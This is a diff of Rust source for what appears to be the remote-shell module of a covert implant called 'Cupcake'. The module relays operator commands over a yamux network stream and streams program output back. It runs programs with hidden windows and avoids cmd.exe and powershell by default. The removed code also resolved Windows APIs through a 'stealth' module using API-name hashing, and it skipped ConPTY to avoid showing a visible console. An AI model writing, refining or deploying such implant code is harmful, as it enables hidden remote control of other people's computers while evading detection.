@@ -1,151 +1,329 @@
-use portable_pty::{CommandBuilder, NativePtySystem, PtySize, Child, PtySystem};
-use std::io::{Read, Write};
+// Interactive terminal over Yamux stream 0x01.
+//
+// Default: HybridSession (Mode A) — builtins + direct exe spawn with streamed pipes.
+// No cmd.exe / powershell by default.
+//
+// Compatibility: set env CUPCAKE_PTY_MODE=cmd for legacy pipe-to-cmd shell.
+
+use log::{debug, error, info};
+use std::path::PathBuf;
+use std::sync::atomic::{AtomicBool, Ordering};
+use std::sync::Arc;
 use tokio::io::{AsyncReadExt, AsyncWriteExt};
+use tokio::sync::Mutex;
 use tokio_util::compat::FuturesAsyncReadCompatExt;
-use std::panic::catch_unwind;
-use std::process::Stdio;
-use encoding_rs::GBK;
-use log::{debug, error, warn};
 
-struct ConPtyGuard {
-    _child: Box<dyn Child + Send>,
-    _system: Box<dyn PtySystem + Send>,
-}
+/// Handle interactive session on a yamux stream.
+pub async fn handle_stream(stream: yamux::Stream) {
+    tokio::time::sleep(std::time::Duration::from_millis(20)).await;
 
-impl Drop for ConPtyGuard {
-    fn drop(&mut self) {
-        debug!("[PTY] Dropping ConPtyGuard, killing child process");
-        let _ = self._child.kill();
-        debug!("[PTY] Child process killed");
+    let mode = std::env::var("CUPCAKE_PTY_MODE")
+        .unwrap_or_default()
+        .to_ascii_lowercase();
+
+    if mode == "cmd" || mode == "legacy" {
+        info!("[PTY] Legacy cmd pipe mode (CUPCAKE_PTY_MODE={})", mode);
+        handle_legacy_cmd_pty(stream).await;
+    } else {
+        info!("[PTY] HybridSession Mode A (no cmd/powershell)");
+        handle_hybrid_session(stream).await;
     }
 }
 
-#[allow(dead_code)]
-enum PtyGuard {
-    ConPty(ConPtyGuard),
-    Pipe(tokio::process::Child),
+// ═══════════════════════════════════════════════════════════════════════════════
+// Mode A — Hybrid interactive command session
+// ═══════════════════════════════════════════════════════════════════════════════
+
+async fn handle_hybrid_session(stream: yamux::Stream) {
+    let (mut net_r, net_w) = tokio::io::split(stream.compat());
+    let net_w = Arc::new(Mutex::new(net_w));
+
+    let mut cwd = std::env::current_dir().unwrap_or_else(|_| PathBuf::from("."));
+    let mut line_buf: Vec<u8> = Vec::with_capacity(512);
+
+    // Shared: Ctrl+C requested / a child is currently running
+    let interrupt = Arc::new(AtomicBool::new(false));
+    let busy = Arc::new(AtomicBool::new(false));
+
+    write_banner_and_prompt(&net_w, &cwd).await;
+
+    let mut read_buf = [0u8; 4096];
+    loop {
+        match net_r.read(&mut read_buf).await {
+            Ok(0) => break,
+            Ok(n) => {
+                let chunk = &read_buf[..n];
+                for &b in chunk {
+                    // ── Ctrl+C ─────────────────────────────────────────────
+                    if b == 0x03 {
+                        if busy.load(Ordering::SeqCst) {
+                            // Signal running child; do NOT reprint prompt here
+                            // (run_hybrid_line will finish and caller prints prompt).
+                            interrupt.store(true, Ordering::SeqCst);
+                        } else {
+                            // Idle: cancel current line, show ^C + prompt
+                            line_buf.clear();
+                            interrupt.store(false, Ordering::SeqCst);
+                            let mut w = net_w.lock().await;
+                            let _ = w.write_all(b"^C\r\n").await;
+                            let prompt = crate::executor::format_prompt(&cwd);
+                            let _ = w.write_all(prompt.as_bytes()).await;
+                            let _ = w.flush().await;
+                        }
+                        continue;
+                    }
+
+                    // Ignore input while a child is running (except Ctrl+C above)
+                    if busy.load(Ordering::SeqCst) {
+                        continue;
+                    }
+
+                    // Backspace
+                    if b == 0x7f || b == 0x08 {
+                        if !line_buf.is_empty() {
+                            line_buf.pop();
+                        }
+                        continue;
+                    }
+
+                    // Enter → run line
+                    if b == b'\r' || b == b'\n' {
+                        if b == b'\n' && line_buf.is_empty() {
+                            continue; // swallow LF after CR
+                        }
+                        let line = String::from_utf8_lossy(&line_buf).trim().to_string();
+                        line_buf.clear();
+
+                        {
+                            let mut w = net_w.lock().await;
+                            let _ = w.write_all(b"\r\n").await;
+                            let _ = w.flush().await;
+                        }
+
+                        if !line.is_empty() {
+                            interrupt.store(false, Ordering::SeqCst);
+                            busy.store(true, Ordering::SeqCst);
+                            run_hybrid_line(
+                                &line,
+                                &mut cwd,
+                                net_w.clone(),
+                                interrupt.clone(),
+                                &mut net_r,
+                                &busy,
+                            )
+                            .await;
+                            busy.store(false, Ordering::SeqCst);
+                            interrupt.store(false, Ordering::SeqCst);
+                        }
+
+                        // Always restore a single clean prompt after a command
+                        {
+                            let mut w = net_w.lock().await;
+                            let prompt = crate::executor::format_prompt(&cwd);
+                            let _ = w.write_all(prompt.as_bytes()).await;
+                            let _ = w.flush().await;
+                        }
+                        continue;
+                    }
+
+                    // Accumulate printable / high-bit bytes
+                    if b >= 0x20 || b >= 0x80 {
+                        line_buf.push(b);
+                    }
+                }
+            }
+            Err(e) => {
+                error!("[Hybrid] network read error: {}", e);
+                break;
+            }
+        }
+    }
+
+    debug!("[Hybrid] session closed");
 }
 
-/// 工业级自适应 PTY 处理器 (支持 GBK 转码与 Windows 8.1 兼容)
-pub async fn handle_stream(stream: yamux::Stream) {
-    // 🛡️ [Hardening] Re-confirm console handles for this thread
-    #[cfg(target_os = "windows")]
-    unsafe {
-        let h_kernel32 = winapi::um::libloaderapi::GetModuleHandleA(b"kernel32.dll\0".as_ptr() as *const _);
-        if !h_kernel32.is_null() {
-            if let Some(set_std_addr) = crate::stealth::get_api_addr(h_kernel32 as usize, crate::stealth::hash_api_name(b"SetStdHandle")) {
-                let set_std_handle: unsafe extern "system" fn(u32, usize) -> i32 = std::mem::transmute(set_std_addr);
-                // Ensure we don't have null handles that could crash the PTY library
-                let h_out = winapi::um::processenv::GetStdHandle(winapi::um::winbase::STD_OUTPUT_HANDLE);
-                if h_out.is_null() || h_out == winapi::um::handleapi::INVALID_HANDLE_VALUE {
-                    // If invalid, try to get a handle to the current console
-                    if let Ok(file) = std::fs::OpenOptions::new().write(true).open("CONOUT$") {
-                        use std::os::windows::io::AsRawHandle;
-                        set_std_handle(winapi::um::winbase::STD_OUTPUT_HANDLE, file.as_raw_handle() as usize);
+async fn write_banner_and_prompt(
+    net_w: &Arc<Mutex<impl AsyncWriteExt + Unpin>>,
+    cwd: &std::path::Path,
+) {
+    let mut w = net_w.lock().await;
+    let _ = w
+        .write_all(
+            b"\r\nMicrosoft Windows [Hybrid Shell]\r\n\
+(c) Hybrid agent terminal. Type HELP for a list of commands.\r\n\
+Ctrl+C interrupts a running program.\r\n",
+        )
+        .await;
+    let prompt = crate::executor::format_prompt(cwd);
+    let _ = w.write_all(prompt.as_bytes()).await;
+    let _ = w.flush().await;
+}
+
+/// Run one command; while external process runs, also poll net for Ctrl+C.
+async fn run_hybrid_line<R>(
+    line: &str,
+    cwd: &mut PathBuf,
+    net_w: Arc<Mutex<impl AsyncWriteExt + Unpin + Send + 'static>>,
+    interrupt: Arc<AtomicBool>,
+    net_r: &mut R,
+    busy: &AtomicBool,
+) where
+    R: AsyncReadExt + Unpin,
+{
+    // Built-in first (fast, no child)
+    if let Some(r) = crate::executor::try_builtin(line, cwd) {
+        let mut w = net_w.lock().await;
+        if !r.stdout.is_empty() {
+            let _ = w.write_all(normalize_newlines(&r.stdout).as_bytes()).await;
+        }
+        if !r.stderr.is_empty() {
+            let _ = w.write_all(normalize_newlines(&r.stderr).as_bytes()).await;
+        }
+        let _ = w.flush().await;
+        return;
+    }
+
+    // External process with concurrent Ctrl+C monitoring
+    let cwd_snap = cwd.clone();
+    let line_owned = line.to_string();
+    let (tx, mut rx) = tokio::sync::mpsc::unbounded_channel::<Vec<u8>>();
+    let interrupt_flag = interrupt.clone();
+
+    let exec_task = tokio::spawn(async move {
+        crate::executor::exec_direct_stream(
+            &line_owned,
+            &cwd_snap,
+            move |chunk| {
+                let _ = tx.send(chunk.to_vec());
+            },
+            move || interrupt_flag.load(Ordering::SeqCst),
+        )
+        .await
+    });
+
+    let mut net_buf = [0u8; 256];
+    let mut exec_done = false;
+    let mut exec_result: Option<Result<i32, String>> = None;
+
+    while !exec_done {
+        tokio::select! {
+            // Child output
+            data = rx.recv() => {
+                match data {
+                    Some(data) => {
+                        let text = normalize_newlines(&String::from_utf8_lossy(&data));
+                        let mut w = net_w.lock().await;
+                        let _ = w.write_all(text.as_bytes()).await;
+                        let _ = w.flush().await;
                     }
+                    None => {
+                        // Channel closed: exec finished (or dropped tx)
+                        // Fall through to join below
+                        exec_done = true;
+                    }
+                }
+            }
+            // Network input while busy — only honor Ctrl+C
+            n = net_r.read(&mut net_buf) => {
+                match n {
+                    Ok(0) => {
+                        // Peer closed — still wait for child cleanup
+                        interrupt.store(true, Ordering::SeqCst);
+                        exec_done = true;
+                    }
+                    Ok(n) => {
+                        if net_buf[..n].iter().any(|&b| b == 0x03) {
+                            interrupt.store(true, Ordering::SeqCst);
+                            let mut w = net_w.lock().await;
+                            let _ = w.write_all(b"^C\r\n").await;
+                            let _ = w.flush().await;
+                        }
+                        // discard other keys while child runs
+                    }
+                    Err(_) => {
+                        interrupt.store(true, Ordering::SeqCst);
+                        exec_done = true;
+                    }
+                }
+            }
+            // Periodic check so we don't hang if channel already closed
+            _ = tokio::time::sleep(std::time::Duration::from_millis(50)) => {
+                if exec_task.is_finished() {
+                    exec_done = true;
                 }
             }
         }
     }
 
-    // 🛡️ [Hardening] Brief pause to allow underlying TCP stack to process window updates
-    tokio::time::sleep(std::time::Duration::from_millis(20)).await;
-    
-    debug!("[PTY] New PTY stream accepted. Thread: {:?}", std::thread::current().id());
+    // Drain remaining output
+    while let Ok(data) = rx.try_recv() {
+        let text = normalize_newlines(&String::from_utf8_lossy(&data));
+        let mut w = net_w.lock().await;
+        let _ = w.write_all(text.as_bytes()).await;
+        let _ = w.flush().await;
+    }
+
+    // Join with timeout so a stuck wait never freezes the session
+    match tokio::time::timeout(std::time::Duration::from_secs(3), exec_task).await {
+        Ok(Ok(Ok(_code))) => {}
+        Ok(Ok(Err(e))) => {
+            let mut w = net_w.lock().await;
+            let _ = w.write_all(normalize_newlines(&e).as_bytes()).await;
+            let _ = w.flush().await;
+        }
+        Ok(Err(e)) => {
+            let mut w = net_w.lock().await;
+            let _ = w
+                .write_all(format!("exec join error: {}\r\n", e).as_bytes())
+                .await;
+            let _ = w.flush().await;
+        }
+        Err(_) => {
+            // Timed out joining — session continues anyway
+            let mut w = net_w.lock().await;
+            let _ = w.write_all(b"\r\n[!] process interrupted (cleanup timeout)\r\n").await;
+            let _ = w.flush().await;
+        }
+    }
+
+    let _ = busy;
+    let _ = exec_result;
+}
+
+fn normalize_newlines(s: &str) -> String {
+    s.replace('\n', "\r\n").replace("\r\r\n", "\r\n")
+}
+
+// ═══════════════════════════════════════════════════════════════════════════════
+// Legacy Mode C — pipe to cmd.exe / sh
+// ═══════════════════════════════════════════════════════════════════════════════
+
+async fn handle_legacy_cmd_pty(stream: yamux::Stream) {
+    use std::process::Stdio;
 
     let (mut net_r, mut net_w) = tokio::io::split(stream.compat());
     let (tx_to_net, mut rx_from_pty) = tokio::sync::mpsc::channel::<Vec<u8>>(4096);
     let (tx_to_pty, rx_from_net) = tokio::sync::mpsc::channel::<Vec<u8>>(4096);
 
-    // 1. 尝试 ConPty (使用独立系统线程以获得最大稳定性)
-    debug!("[PTY] Spawning dedicated setup thread...");
-    let (setup_tx, setup_rx) = tokio::sync::oneshot::channel();
-    
-    std::thread::spawn(move || {
-        let result = catch_unwind(|| -> Result<(Box<dyn Child + Send>, Box<dyn Read + Send>, Box<dyn Write + Send>, Box<dyn PtySystem + Send>), String> {
-            // 🛡️ Windows FIX: Skip ConPTY — it creates a visible cmd.exe window.
-            // Use PipeShell fallback (already has CREATE_NO_WINDOW).
-            #[cfg(target_os = "windows")]
-            {
-                return Err("[FIX] ConPTY skipped on Windows (visible cmd.exe). Using PipeShell (CREATE_NO_WINDOW)".to_string());
-            }
-
-            debug!("[PTY] Initializing NativePtySystem...");
-            let pty_system = NativePtySystem::default();
-            #[allow(unused_variables)]
-            let pair = pty_system.openpty(PtySize { rows: 24, cols: 80, ..Default::default() })
-                .map_err(|e| format!("Failed to open PTY (API error): {:?}", e))?;
-
-            let shell = if cfg!(windows) { "cmd.exe" } else { "/bin/bash" };
-            let mut cmd = CommandBuilder::new(shell);
-            if cfg!(windows) {
-                if let Ok(val) = std::env::var("SystemRoot") {
-                    cmd.env("SystemRoot", &val);
-                }
-            }
-            cmd.env("TERM", "xterm-256color");
-
-            let child = pair.slave.spawn_command(cmd).map_err(|e| format!("Failed to spawn shell: {:?}", e))?;
-            let reader = pair.master.try_clone_reader().map_err(|e| format!("Failed to clone reader: {:?}", e))?;
-            let writer = pair.master.take_writer().map_err(|e| format!("Failed to take writer: {:?}", e))?;
-
-            debug!("[PTY] Dedicated thread setup successful");
-            Ok((child, reader, writer, Box::new(pty_system)))
-        });
-
-        let final_res = match result {
-            Ok(inner) => inner,
-            Err(p) => Err(format!("Panic in dedicated thread: {:?}", p)),
-        };
-        let _ = setup_tx.send(final_res);
-    });
-
-    let pty_setup = setup_rx.await;
-
-    // 2. 核心分发逻辑
-    let (child_guard, pty_read_task, pty_write_task) = match pty_setup {
-        Ok(Ok((child, reader, writer, _system))) => {
-            debug!("[PTY] ConPty mode active (Industrial Shell)");
-            // 发送 PTY 就绪信号（可选）
-            let _ = tx_to_net.send(b"\r\n\x1b[1;32m[+] Industrial PTY Session Started.\x1b[0m\r\n\r\n".to_vec()).await;
-
-            let (r, w) = spawn_io_tasks(reader, writer, tx_to_net, rx_from_net);
-            (Some(PtyGuard::ConPty(ConPtyGuard { _child: child, _system: _system })), r, w)
-        },
-        Ok(Err(e)) => {
-            warn!("[PTY] ConPty initialization failed: {}. Falling back to PipeShell...", e);
-            match spawn_pipe_shell(tx_to_net, rx_from_net).await {
-                Ok((c, r, w)) => (Some(PtyGuard::Pipe(c)), r, w),
-                Err(e) => {
-                    error!("[PTY] Fallback PipeShell also failed: {}", e);
-                    return;
-                }
-            }
-        },
-        Err(recv_error) => {
-            error!("[PTY] Dedicated thread communication error: {}. Falling back to PipeShell...", recv_error);
-            match spawn_pipe_shell(tx_to_net, rx_from_net).await {
-                Ok((c, r, w)) => (Some(PtyGuard::Pipe(c)), r, w),
-                Err(e) => {
-                    error!("[PTY] Fallback PipeShell also failed: {}", e);
-                    return;
-                }
-            }
+    let mut child = match spawn_pipe_shell(tx_to_net, rx_from_net).await {
+        Ok(c) => c,
+        Err(e) => {
+            error!("[PTY] PipeShell failed: {}", e);
+            let _ = net_w
+                .write_all(format!("\r\n[!] Pipe shell failed: {}\r\n", e).as_bytes())
+                .await;
+            return;
         }
     };
 
-    // 3. 网络传输循环
     let net_read = async {
         let mut buf = [0u8; 8192];
         loop {
             match net_r.read(&mut buf).await {
-                Ok(0) => {
-                    debug!("[PTY] Network read EOF, closing connection");
-                    break;
-                }
+                Ok(0) => break,
                 Ok(n) => {
-                    if tx_to_pty.send(buf[..n].to_vec()).await.is_err() {
-                        warn!("[PTY] Failed to send data to PTY, channel closed");
+                    let chunk = normalize_input_for_shell(&buf[..n]);
+                    if tx_to_pty.send(chunk).await.is_err() {
                         break;
                     }
                 }
@@ -159,88 +337,51 @@ pub async fn handle_stream(stream: yamux::Stream) {
 
     let net_write = async {
         while let Some(data) = rx_from_pty.recv().await {
-            if let Err(e) = net_w.write_all(&data).await {
-                error!("[PTY] Network write error: {}", e);
+            if net_w.write_all(&data).await.is_err() {
                 break;
             }
             let _ = net_w.flush().await;
-            // 🛡️ [Hardening] Yield to allow other tasks to process
             tokio::task::yield_now().await;
         }
-        debug!("[PTY] Network write task finished");
     };
 
     tokio::select! {
-        _ = net_read => { debug!("[PTY] net_read finished"); },
-        _ = net_write => { debug!("[PTY] net_write finished"); },
-        _ = pty_read_task => { debug!("[PTY] pty_read_task finished"); },
-        _ = pty_write_task => { debug!("[PTY] pty_write_task finished"); },
+        _ = net_read => {},
+        _ = net_write => {},
     }
 
-    debug!("[PTY] Cleaning up PTY session");
-    // Drop guard naturally, which kills the child process.
-    drop(child_guard);
-    debug!("[PTY] PTY session terminated");
+    let _ = child.kill().await;
+    debug!("[PTY] Legacy session terminated");
 }
 
-fn spawn_io_tasks(
-    mut reader: Box<dyn Read + Send>,
-    mut writer: Box<dyn Write + Send>,
-    tx_to_net: tokio::sync::mpsc::Sender<Vec<u8>>,
-    mut rx_from_net: tokio::sync::mpsc::Receiver<Vec<u8>>
-) -> (tokio::task::JoinHandle<()>, tokio::task::JoinHandle<()>) {
-    let r_task = tokio::task::spawn_blocking(move || {
-        debug!("[PTY] ConPty reader task started");
-        let mut buf = [0u8; 16384];
-        loop {
-            match reader.read(&mut buf) {
-                Ok(0) => {
-                    debug!("[PTY] ConPty reader EOF");
-                    break;
-                }
-                Ok(n) => {
-                    if tx_to_net.blocking_send(buf[..n].to_vec()).is_err() {
-                        warn!("[PTY] ConPty reader: failed to send to network channel");
-                        break;
-                    }
-                }
-                Err(e) => {
-                    error!("[PTY] ConPty reader error: {}", e);
-                    break;
-                }
+fn normalize_input_for_shell(data: &[u8]) -> Vec<u8> {
+    let mut out = Vec::with_capacity(data.len() + 8);
+    for &b in data {
+        if b == b'\r' {
+            out.push(b'\r');
+            out.push(b'\n');
+        } else if b == b'\n' {
+            if out.last() != Some(&b'\n') {
+                out.push(b'\n');
             }
+        } else {
+            out.push(b);
         }
-        debug!("[PTY] ConPty reader task finished");
-    });
-
-    let w_task = tokio::task::spawn_blocking(move || {
-        debug!("[PTY] ConPty writer task started");
-        while let Some(data) = rx_from_net.blocking_recv() {
-            if let Err(e) = writer.write_all(&data) {
-                error!("[PTY] ConPty writer error: {}", e);
-                break;
-            }
-            let _ = writer.flush();
-        }
-        debug!("[PTY] ConPty writer task finished");
-    });
-
-    (r_task, w_task)
+    }
+    out
 }
 
-/// 🚀 增强版 Windows 管道 Shell：支持 GBK -> UTF8 实时转码
 async fn spawn_pipe_shell(
     tx_to_net: tokio::sync::mpsc::Sender<Vec<u8>>,
-    mut rx_from_net: tokio::sync::mpsc::Receiver<Vec<u8>>
-) -> std::result::Result<(tokio::process::Child, tokio::task::JoinHandle<()>, tokio::task::JoinHandle<()>), String> {
+    mut rx_from_net: tokio::sync::mpsc::Receiver<Vec<u8>>,
+) -> Result<tokio::process::Child, String> {
     use tokio::process::Command;
-
-    debug!("[PTY] Spawning fallback pipe shell");
 
     let mut cmd = if cfg!(windows) {
         let mut c = Command::new("cmd.exe");
+        c.arg("/Q");
         #[cfg(windows)]
-        c.creation_flags(0x08000000 | 0x00000008); // CREATE_NO_WINDOW | DETACHED_PROCESS
+        c.creation_flags(0x0800_0000);
         c
     } else {
         Command::new("sh")
@@ -255,110 +396,91 @@ async fn spawn_pipe_shell(
         .spawn()
         .map_err(|e| format!("Failed to spawn shell: {}", e))?;
 
-    debug!("[PTY] Pipe shell spawned successfully");
+    let mut stdin = child
+        .stdin
+        .take()
+        .ok_or_else(|| "Failed to take stdin".to_string())?;
+    let mut stdout = child
+        .stdout
+        .take()
+        .ok_or_else(|| "Failed to take stdout".to_string())?;
+    let mut stderr = child
+        .stderr
+        .take()
+        .ok_or_else(|| "Failed to take stderr".to_string())?;
 
-    let mut stdin = child.stdin.take().ok_or_else(|| "Failed to take stdin".to_string())?;
-    let mut stdout = child.stdout.take().ok_or_else(|| "Failed to take stdout".to_string())?;
-    let mut stderr = child.stderr.take().ok_or_else(|| "Failed to take stderr".to_string())?;
+    let _ = tx_to_net
+        .send(b"\r\n[+] Legacy pipe shell (cmd/sh).\r\n\r\n".to_vec())
+        .await;
 
-    let _ = tx_to_net.send(b"{\"type\": \"PTY_MODE\", \"content\": \"fallback\"}".to_vec()).await;
-    let _ = tx_to_net.send(b"\r\n\x1b[32m[+] Legacy Pipe Stream Started.\x1b[0m\r\n\r\n".to_vec()).await;
-
-    // 1. Stdout 读取
     let tx_out = tx_to_net.clone();
-    let r_out = tokio::spawn(async move {
-        debug!("[PTY] Pipe stdout reader started");
-        let mut buf = [0u8; 16384];
+    tokio::spawn(async move {
+        let mut buf = [0u8; 4096];
         loop {
             match stdout.read(&mut buf).await {
-                Ok(0) => {
-                    debug!("[PTY] Pipe stdout EOF");
-                    break;
-                }
+                Ok(0) => break,
                 Ok(n) => {
-                    let data = &buf[..n];
-
-                    #[cfg(windows)]
-                    let payload = {
-                        let (res, _, has_error) = GBK.decode(data);
-                        if !has_error { res.as_bytes().to_vec() } else { data.to_vec() }
-                    };
-                    #[cfg(not(windows))]
-                    let payload = data.to_vec();
-
-                    if tx_out.send(payload).await.is_err() {
-                        warn!("[PTY] Pipe stdout: failed to send to network channel");
+                    if tx_out.send(decode_output(&buf[..n])).await.is_err() {
                         break;
                     }
                 }
-                Err(e) => {
-                    error!("[PTY] Pipe stdout read error: {}", e);
-                    break;
-                }
+                Err(_) => break,
             }
         }
-        debug!("[PTY] Pipe stdout reader finished");
     });
 
-    // 2. Stderr 读取
-    let tx_err = tx_to_net.clone();
-    let r_err = tokio::spawn(async move {
-        debug!("[PTY] Pipe stderr reader started");
-        let mut buf = [0u8; 16384];
+    let tx_err = tx_to_net;
+    tokio::spawn(async move {
+        let mut buf = [0u8; 4096];
         loop {
             match stderr.read(&mut buf).await {
-                Ok(0) => {
-                    debug!("[PTY] Pipe stderr EOF");
-                    break;
-                }
+                Ok(0) => break,
                 Ok(n) => {
-                    let data = &buf[..n];
-
-                    #[cfg(windows)]
-                    let payload = {
-                        let (res, _, has_error) = GBK.decode(data);
-                        if !has_error { res.as_bytes().to_vec() } else { data.to_vec() }
-                    };
-                    #[cfg(not(windows))]
-                    let payload = data.to_vec();
-
-                    if tx_err.send(payload).await.is_err() {
-                        warn!("[PTY] Pipe stderr: failed to send to network channel");
+                    if tx_err.send(decode_output(&buf[..n])).await.is_err() {
                         break;
                     }
                 }
-                Err(e) => {
-                    error!("[PTY] Pipe stderr read error: {}", e);
-                    break;
-                }
+                Err(_) => break,
             }
         }
-        debug!("[PTY] Pipe stderr reader finished");
     });
 
-    // 3. Stdin 处理
-    let w_task = tokio::spawn(async move {
-        debug!("[PTY] Pipe stdin writer started");
+    tokio::spawn(async move {
         while let Some(data) = rx_from_net.recv().await {
-            #[cfg(windows)]
-            let final_data = {
-                let utf8_str = String::from_utf8_lossy(&data).to_string();
-                let (gbk_data, _, _) = GBK.encode(&utf8_str);
-                gbk_data.into_owned()
-            };
-            #[cfg(not(windows))]
-            let final_data = data;
-
-            if let Err(e) = stdin.write_all(&final_data).await {
-                error!("[PTY] Pipe stdin write error: {}", e);
+            if stdin.write_all(&data).await.is_err() {
                 break;
             }
             let _ = stdin.flush().await;
         }
-        debug!("[PTY] Pipe stdin writer finished");
     });
 
-    let combined_r = tokio::spawn(async move { let _ = tokio::join!(r_out, r_err); });
+    Ok(child)
+}
 
-    Ok((child, combined_r, w_task))
+fn decode_output(data: &[u8]) -> Vec<u8> {
+    #[cfg(all(windows, feature = "encoding-support"))]
+    {
+        let (res, _, has_error) = encoding_rs::GBK.decode(data);
+        if !has_error {
+            return res.as_bytes().to_vec();
+        }
+    }
+    data.to_vec()
+}
+
+use std::process::Stdio;
+
+#[cfg(test)]
+mod tests {
+    use super::normalize_input_for_shell;
+
+    #[test]
+    fn cr_becomes_crlf() {
+        assert_eq!(normalize_input_for_shell(b"dir\r"), b"dir\r\n");
+    }
+
+    #[test]
+    fn crlf_not_doubled() {
+        assert_eq!(normalize_input_for_shell(b"dir\r\n"), b"dir\r\n");
+    }
 }
